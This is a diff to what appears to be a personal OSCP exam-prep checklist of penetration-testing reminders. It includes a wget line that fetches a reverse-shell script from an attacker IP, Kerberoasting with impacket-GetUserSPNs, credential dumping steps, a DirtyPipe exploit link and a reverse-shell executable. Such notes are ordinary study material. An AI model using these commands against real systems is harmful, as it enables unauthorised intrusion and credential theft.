@@ -2,6 +2,7 @@
 - Did we run cmdkey /list?
 - Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
 - Did we try crackmapexec mssql 192.168.x.x ...?
+- Make sure to check history as admin after rooting first machine (smb)
 - Did you try uploading files on inetpub?? ( we can get service account that has seimpersonateprivilege)
 - Did we search cve-2020-xx github, exploit...blahblah?
 - Did we run "impacket-GetUserSPNs 'oscp.exam/web_svc' -dc-ip 10.10.135.146 -request" ??
@@ -58,6 +59,8 @@ sudo -l (gcore)
 credentials from running process!
 cronjob that runs every minute
 kernel exploit(https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
+admintool.exe (by running exe file we found admin password. make sure to run after triggering revshell7777.exe)
+
 
 ```
 
